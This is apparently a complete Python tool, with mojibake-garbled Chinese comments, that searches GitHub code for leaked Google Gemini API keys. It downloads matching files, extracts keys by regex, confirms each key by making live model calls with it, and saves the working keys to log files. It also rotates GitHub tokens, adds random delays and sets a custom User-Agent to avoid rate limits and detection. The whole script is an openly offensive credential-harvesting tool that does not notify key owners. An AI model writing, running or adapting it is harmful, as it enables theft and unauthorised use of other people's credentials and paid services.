import requests
import json
import time
import os
import random
import re
from datetime import datetime, timedelta
from dotenv import load_dotenv
import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

load_dotenv()

# --- PROXY CONFIGURATION ---
# é€šè¿‡ç¯å¢ƒå˜é‡ PROXY_URL æ§åˆ¶ï¼›é»˜è®¤ä¸ä½¿ç”¨ä»£ç†
PROXY_URL = os.environ.get("PROXY_URL", "").strip()

if PROXY_URL:
    print(f"Using proxy: {PROXY_URL}")
    os.environ["https_proxy"] = PROXY_URL
    os.environ["http_proxy"] = PROXY_URL
# --- END PROXY CONFIGURATION ---

# GitHub API endpoint for code search
GITHUB_API_URL = "https://api.github.com/search/code"

# ç”¨æˆ·å¯è°ƒæ•´ï¼šä»…æœç´¢æœ€è¿‘ N å¹´å†…æ›´æ–°è¿‡çš„ä»“åº“æ–‡ä»¶
DATE_RANGE_YEARS = 2
# è®¡ç®—æ—¶é—´æˆªæ­¢ç‚¹ï¼ˆUTCï¼‰
_date_cutoff = (datetime.utcnow() - timedelta(days=365 * DATE_RANGE_YEARS)).strftime('%Y-%m-%d')

# Key æœç´¢è¯åˆ—è¡¨ - åˆ†å±‚ç­–ç•¥ï¼šæ ¸å¿ƒæŸ¥è¯¢ + æ‰©å±•æŸ¥è¯¢
# åŸºäºå®æˆ˜ç»éªŒï¼š"æ­£åˆ™+è¯­è¨€+æ’é™¤è¯æ˜¯æœ€ç²¾å‡†çš„"ï¼Œ"pyå’Œjupyteræ˜¯é‡ç¾åŒºï¼Œjså’Œtsæ˜¯é‡ç¾åŒº"

# ğŸ¯ æ ¸å¿ƒæŸ¥è¯¢ (é«˜ä»·å€¼ï¼Œå¿…é¡»æ‰§è¡Œ)
CORE_SEARCH_QUERIES = [
    '"AIzaSy" language:python',                  # Python é‡ç¾åŒº
    '"AIzaSy" extension:ipynb',                  # Jupyter Notebook é‡ç¾åŒº  
    '"AIzaSy" language:javascript',              # JavaScript é‡ç¾åŒº
    '"AIzaSy" language:typescript',              # TypeScript é‡ç¾åŒº
    '"AIzaSy" -map -maps -youtube -example -demo -tutorial',  # é€šç”¨æœç´¢+æ’é™¤è¯
    'GEMINI_API_KEY in:file',                    # æœ€å¸¸è§çš„ç¯å¢ƒå˜é‡å
    'filename:.env "AIzaSy" -example',           # .env æ–‡ä»¶ (é…ç½®é‡ç¾åŒº)
]

# ğŸ” æ‰©å±•æŸ¥è¯¢ (å¯é€šè¿‡ç¯å¢ƒå˜é‡ ENABLE_EXTENDED_SEARCH=true å¯ç”¨)
EXTENDED_SEARCH_QUERIES = [
    # æ›´å¤šç¯å¢ƒå˜é‡å‘½åæ¨¡å¼
    'GOOGLE_API_KEY in:file -map -maps',         # Google API é€šç”¨å˜é‡å
    'google_api_key in:file -map -maps',         # å°å†™ç‰ˆæœ¬
    'gemini_api_key in:file',                    # å°å†™geminiå˜é‡
    
    # SDKä½¿ç”¨æ¨¡å¼ (é’ˆå¯¹å®é™…ä»£ç )
    'genai.configure language:python',           # Python GenAI SDKé…ç½®
    'google.generativeai language:python',       # Pythonå®Œæ•´å¯¼å…¥
    
    # ç‰¹å®šé…ç½®æ–‡ä»¶
    'filename:.yaml "AIzaSy" -example',          # YAMLé…ç½®æ–‡ä»¶
    'filename:.json "AIzaSy" -example -package', # JSONé…ç½®ï¼Œæ’é™¤package.json
    
    # è¯­è¨€ç‰¹å®šç¯å¢ƒå˜é‡è®¿é—®
    'os.environ "AIzaSy" language:python',       # Pythonç¯å¢ƒå˜é‡
    'process.env "AIzaSy" language:javascript',  # Node.jsç¯å¢ƒå˜é‡
    'process.env "AIzaSy" language:typescript',  # TypeScriptç¯å¢ƒå˜é‡
    
    # ä»£ç èµ‹å€¼æ¨¡å¼
    '"api_key=" "AIzaSy" -example -demo',        # ç›´æ¥èµ‹å€¼
    '"apiKey:" "AIzaSy" language:javascript',    # JS/TSå¯¹è±¡å±æ€§
]

# åŠ¨æ€ç»„åˆæœç´¢æŸ¥è¯¢
def get_search_queries():
    """æ ¹æ®ç¯å¢ƒå˜é‡å†³å®šä½¿ç”¨æ ¸å¿ƒæŸ¥è¯¢è¿˜æ˜¯æ‰©å±•æŸ¥è¯¢"""
    queries = CORE_SEARCH_QUERIES.copy()
    
    # æ£€æŸ¥æ˜¯å¦å¯ç”¨æ‰©å±•æœç´¢
    enable_extended = os.environ.get("ENABLE_EXTENDED_SEARCH", "").lower() in ("true", "1", "yes")
    if enable_extended:
        queries.extend(EXTENDED_SEARCH_QUERIES)
        print(f"æ‰©å±•æœç´¢å·²å¯ç”¨ï¼Œæ€»æŸ¥è¯¢æ•°: {len(queries)}")
    else:
        print(f"ä½¿ç”¨æ ¸å¿ƒæœç´¢æŸ¥è¯¢ï¼ŒæŸ¥è¯¢æ•°: {len(queries)} (è®¾ç½® ENABLE_EXTENDED_SEARCH=true å¯ç”¨æ‰©å±•æœç´¢)")
    
    return queries

# ä¸ºäº†å‘åå…¼å®¹ï¼Œä¿ç•™åŸå˜é‡å
SEARCH_QUERIES = get_search_queries()

# Your GitHub Personal Access Token should be set as an environment variable.
# Using a token increases the rate limit for API requests.
# Example: export GITHUB_TOKEN="your_token_here"
# æ”¯æŒé…ç½®å¤šä¸ª PATï¼Œç”¨é€—å·åˆ†éš”
_tok_env = os.environ.get("GITHUB_TOKENS")
if _tok_env:
    GITHUB_TOKENS = [t.strip() for t in _tok_env.split(",") if t.strip()]
else:
    single = os.environ.get("GITHUB_TOKEN")
    # è‹¥ä» CI/Secrets æ³¨å…¥çš„ token å¸¦æœ‰æ¢è¡Œæˆ–ç©ºæ ¼ï¼Œå…ˆè¿›è¡Œ strip()
    GITHUB_TOKENS = [single.strip()] if single and single.strip() else []

# è½®è¯¢ç´¢å¼•
_token_ptr = 0

def _next_token():
    """è¿”å›ä¸‹ä¸€ä¸ª GitHub Tokenï¼Œè‹¥æ— åˆ™ None"""
    global _token_ptr
    if not GITHUB_TOKENS:
        return None
    tok = GITHUB_TOKENS[_token_ptr % len(GITHUB_TOKENS)]
    _token_ptr += 1
    # å†æ¬¡ strip()ï¼Œç¡®ä¿ä¸å­˜åœ¨éšè—ç©ºç™½å­—ç¬¦
    return tok.strip() if isinstance(tok, str) else tok

# Maximum runtime for the script in minutes. å¯é€šè¿‡ç¯å¢ƒå˜é‡è¦†ç›–ã€‚
# Set to 0 or a negative number to run indefinitely.
try:
    MAX_RUNTIME_MINUTES = int(os.environ.get("MAX_RUNTIME_MINUTES", "60"))
except ValueError:
    MAX_RUNTIME_MINUTES = 60

# ----------------- å¢é‡æ‰«æï¼šæ£€æŸ¥ç‚¹æ–‡ä»¶ -----------------
# æ‰«æè¿›åº¦ä¿å­˜çš„æ–‡ä»¶å
CHECKPOINT_FILE = "checkpoint.json"


def load_checkpoint():
    """åŠ è½½ checkpoint.jsonï¼Œè¿”å› dictã€‚è‹¥ä¸å­˜åœ¨åˆ™è¿”å›åˆå§‹ç»“æ„"""
    if os.path.isfile(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                # åŸºæœ¬å­—æ®µä¿éšœ
                data.setdefault("last_scan_time", None)
                data.setdefault("scanned_shas", [])
                return data
        except Exception as e:
            print(f"Warning: æ— æ³•è¯»å– {CHECKPOINT_FILE}: {e}. å°†é‡å»ºã€‚")
    # é»˜è®¤ç»“æ„
    return {"last_scan_time": None, "scanned_shas": []}


def save_checkpoint(data: dict):
    """å°† checkpoint æ•°æ®å†™å…¥æ–‡ä»¶"""
    try:
        with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Error: ä¿å­˜ {CHECKPOINT_FILE} å¤±è´¥: {e}")

# æ–°å¢ï¼šå…¨å±€å˜é‡ç”¨äºå­˜å‚¨åªå« key çš„è¾“å‡ºæ–‡ä»¶å
KEYS_ONLY_FILENAME = None

def search_github_for_keys(query, token=None, max_retries=3):
    """
    Searches GitHub for code matching the given query.
    """
    # ä½¿ç”¨è‡ªå®šä¹‰ UAï¼Œé¿å…è¢«åˆ¤å®šè„šæœ¬
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "GeminiScanner/1.0"
    }
    # ç»Ÿä¸€å»é™¤ token ä¸¤ç«¯ç©ºç™½ï¼Œé¿å…å‡ºç°éæ³• Header é”™è¯¯
    if token:
        token = token.strip()
        headers["Authorization"] = f"token {token}"

    params = {
        "q": query,
        "per_page": 100  # Max results per page
    }

    for attempt in range(1, max_retries + 1):
        try:
            response = requests.get(GITHUB_API_URL, headers=headers, params=params, timeout=30)
            # 403 ä¹Ÿä¼šè¢« raise_for_status æ•è·
            response.raise_for_status()
            return response.json()
        except requests.exceptions.HTTPError as e:
            status = e.response.status_code if e.response else None
            if status in (403, 429):
                wait = 2 ** attempt + random.uniform(0, 1)
                print(f"[search] Hit rate limit or forbidden (HTTP {status}). Retrying in {wait:.1f}s... (attempt {attempt}/{max_retries})")
                time.sleep(wait)
                # è½®æ¢ token
                token = _next_token()
                if token:
                    headers["Authorization"] = f"token {token}"
                continue
            else:
                print(f"HTTP Error making request to GitHub API: {e}")
                return None
        except requests.exceptions.RequestException as e:
            wait = 2 ** attempt
            print(f"Network error: {e}. Retrying in {wait}s (attempt {attempt}/{max_retries})")
            time.sleep(wait)
    print("Exceeded maximum retries for query:", query)
    return None

def get_file_content(item):
    """
    Downloads the content of a file from GitHub by first fetching its metadata.
    """
    repo_full_name = item["repository"]["full_name"]
    file_path = item["path"]
    
    # Step 1: Get the file's metadata to find the download_url
    metadata_url = f"https://api.github.com/repos/{repo_full_name}/contents/{file_path}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
    }
    token = _next_token()
    if token:
        headers["Authorization"] = f"token {token}"
    
    try:
        metadata_response = requests.get(metadata_url, headers=headers)
        metadata_response.raise_for_status()
        file_metadata = metadata_response.json()
        
        download_url = file_metadata.get("download_url")
        if not download_url:
            print(f"Warning: Could not find download_url in metadata for {item['html_url']}. Skipping.")
            return None

        # Step 2: Download the actual file content
        content_response = requests.get(download_url, headers=headers)
        content_response.raise_for_status()
        return content_response.text

    except requests.exceptions.RequestException as e:
        print(f"Error downloading file content for {item['html_url']}: {e}")
        return None

def extract_keys_from_content(content):
    """
    Extracts Gemini API keys from a string using regex.
    """
    # Regex for Google AI API Keys (starts with AIzaSy)
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)

def validate_gemini_key(api_key):
    """
    Validates a Gemini API key by sending a simple "hi" request.
    Returns True if the key is valid, False otherwise.
    """
    try:
        # Pauses execution for 5 seconds
        time.sleep(5)
        
        # Configure the client with the API key and proxy settings
        genai.configure(
            api_key=api_key,
            transport="rest",
            client_options={"api_endpoint": "generativelanguage.googleapis.com"},
        )
        
        # ä½¿ç”¨è¾ƒæ–°çš„ Gemini éªŒè¯æ¨¡å‹
        model = genai.GenerativeModel('gemini-2.5-flash-preview-05-20')
        # Send a simple, low-cost request to verify the key
        response = model.generate_content("hi")
        # If we get a response, the key is valid
        return True
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
        print(f"  -> Invalid API Key: {api_key[:10]}... Reason: {e.__class__.__name__}")
        return False
    except Exception as e:
        # Catch other potential exceptions (e.g., network issues, timeout)
        print(f"  -> An unexpected error occurred during key validation: {e}")
        return False

def save_result_to_file(log_filename, repo_name, file_path, file_url, valid_keys):
    """å°†éªŒè¯æˆåŠŸçš„å¯†é’¥å†™å…¥æŒ‡å®šæ—¥å¿—æ–‡ä»¶"""
    with open(log_filename, "a", encoding="utf-8") as f:
        f.write(f"Repository: {repo_name}\n")
        f.write(f"File: {file_path}\n")
        f.write(f"URL: {file_url}\n")
        for key in valid_keys:
            f.write(f"VALID KEY: {key}\n")
        f.write("-" * 80 + "\n")
    # æ–°å¢ï¼šåŒæ—¶æŠŠ key è¿½åŠ åˆ°å•ç‹¬æ–‡ä»¶
    global KEYS_ONLY_FILENAME
    if KEYS_ONLY_FILENAME:
        with open(KEYS_ONLY_FILENAME, "a", encoding="utf-8") as kf:
            for key in valid_keys:
                kf.write(f"{key}\n")

def main():
    """
    Main function to run the Gemini API key scanner.
    """
    if not GITHUB_TOKENS:
        print("GitHub token not found. Please set the GITHUB_TOKEN or GITHUB_TOKENS environment variable.")
        print("You can create a token at: https://github.com/settings/tokens")
        return

    start_time = datetime.now()
    print(f"Scan started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # ä¸ºæœ¬æ¬¡æ‰«æç”Ÿæˆç‹¬ç«‹æ—¥å¿—æ–‡ä»¶
    log_filename = f"found_keys_{start_time.strftime('%Y%m%d_%H%M%S')}.log"
    # æ–°å¢ï¼šç”ŸæˆåªåŒ…å« key çš„æ–‡ä»¶å
    global KEYS_ONLY_FILENAME
    KEYS_ONLY_FILENAME = f"found_keys_only_{start_time.strftime('%Y%m%d_%H%M%S')}.txt"
    print(f"Log file: {log_filename}")
    # æ‰“å°çº¯ key æ–‡ä»¶å
    print(f"Keys-only file: {KEYS_ONLY_FILENAME}")

    # åŠ¨æ€è·å–æœç´¢æŸ¥è¯¢åˆ—è¡¨
    current_queries = get_search_queries()
    print(f"Search queries: {', '.join(current_queries)}")
    if MAX_RUNTIME_MINUTES > 0:
        print(f"Script will run for a maximum of {MAX_RUNTIME_MINUTES} minutes.")

    # è¯»å– checkpoint ä»¥ä¾¿å¢é‡æ‰«æ
    checkpoint = load_checkpoint()
    scanned_shas = set(checkpoint.get("scanned_shas", []))
    last_scan_time_str = checkpoint.get("last_scan_time")
    if last_scan_time_str:
        print(f"å¢é‡æ¨¡å¼ï¼šè·³è¿‡ {len(scanned_shas)} ä¸ªå·²æ‰«ææ–‡ä»¶ï¼›ä»…å¤„ç†ä»“åº“ push æ—¶é—´æ™šäº {last_scan_time_str} çš„ç»“æœã€‚")

    # ç»Ÿè®¡ä¸åŒæŸ¥è¯¢å¾—åˆ°çš„ item
    aggregated_items = []
    for q in current_queries:
        res = search_github_for_keys(q, _next_token())
        if res and "items" in res:
            aggregated_items.extend(res["items"])

    if aggregated_items:
        total_keys_found = 0
        print(f"Found {len(aggregated_items)} potential files after aggregation. Now scanning contents...")
        for item in aggregated_items:
            if MAX_RUNTIME_MINUTES > 0 and (datetime.now() - start_time) > timedelta(minutes=MAX_RUNTIME_MINUTES):
                print("\nMaximum runtime exceeded. Stopping scan.")
                break

            # è‹¥ checkpoint å¯åŠ¨ä¸”ä»“åº“ push æ—©äºä¸Šæ¬¡æ‰«æï¼Œåˆ™è·³è¿‡
            if last_scan_time_str:
                try:
                    last_scan_dt = datetime.fromisoformat(last_scan_time_str)
                    repo_pushed_at = item["repository"].get("pushed_at")
                    if repo_pushed_at:
                        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                        if repo_pushed_dt <= last_scan_dt:
                            continue
                except Exception:
                    # è‹¥æ— æ³•è§£æåˆ™ç»§ç»­åç»­é€»è¾‘
                    pass

            # å¦‚æœè¯¥æ–‡ä»¶ sha å·²ç»æ‰«æè¿‡ï¼Œåˆ™è·³è¿‡
            if item.get("sha") in scanned_shas:
                continue

            # åŸæœ‰ï¼šå¦‚æœä»“åº“æœ€è¿‘ä¸€æ¬¡ push æ—©äºæ—¶é—´çª—å£ï¼Œåˆ™è·³è¿‡
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt < datetime.utcnow() - timedelta(days=365 * DATE_RANGE_YEARS):
                    continue

            # è·³è¿‡æ˜æ˜¾çš„æ–‡æ¡£æˆ–ç¤ºä¾‹æ–‡ä»¶
            lowercase_path = item["path"].lower()
            if any(token in lowercase_path for token in ["readme", "docs", "doc/", ".md", "example", "sample", "tutorial"]):
                continue

            delay = random.uniform(1, 4)
            file_url = item["html_url"]
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Checking {file_url} ... (waiting {delay:.2f}s)")
            time.sleep(delay)

            content = get_file_content(item)
            if content:
                keys = extract_keys_from_content(content)

                # è¿‡æ»¤å ä½ç¬¦ï¼ˆå¦‚ AIzaSy... å¸¦çœç•¥å·æˆ– YOUR_API_KEY ç­‰ï¼‰
                filtered_keys = []
                for key in keys:
                    # å¦‚æœ key å‘¨å›´ 5 å­—ç¬¦å†…å« "..." åˆ™è·³è¿‡
                    context_index = content.find(key)
                    if context_index != -1:
                        snippet = content[context_index:context_index+45]
                        if "..." in snippet or "YOUR_" in snippet.upper():
                            continue
                    filtered_keys.append(key)
                keys = filtered_keys

                if keys:
                    print(f"SUCCESS: Found {len(keys)} potential key(s) in {file_url}. Validating...")
                    
                    valid_keys = []
                    for key in keys:
                        if validate_gemini_key(key):
                            valid_keys.append(key)
                            print(f"  -> VALID key found: {key[:10]}...")
                    
                    if valid_keys:
                        total_keys_found += len(valid_keys)
                        repo_name = item["repository"]["full_name"]
                        file_path = item["path"]
                        file_url = item["html_url"]
                        
                        print("-" * 80)
                        save_result_to_file(log_filename, repo_name, file_path, file_url, valid_keys)
                        print(f"Result for {len(valid_keys)} valid key(s) saved to {log_filename}. Total valid keys found so far: {total_keys_found}")
                    else:
                        print("  -> No valid keys found in this file.")

                # æ— è®ºæ‰¾åˆ°ä¸å¦ï¼Œéƒ½è®°ä½å·²æ‰«æ sha
                if item.get("sha"):
                    scanned_shas.add(item["sha"])

    else:
        print("No results found or an error occurred.")

    print("-" * 80)
    print("Scan complete.")

    # ä¿å­˜æ–°çš„ checkpoint
    checkpoint["last_scan_time"] = datetime.utcnow().isoformat()
    checkpoint["scanned_shas"] = list(scanned_shas)
    save_checkpoint(checkpoint)

if __name__ == "__main__":
    main()
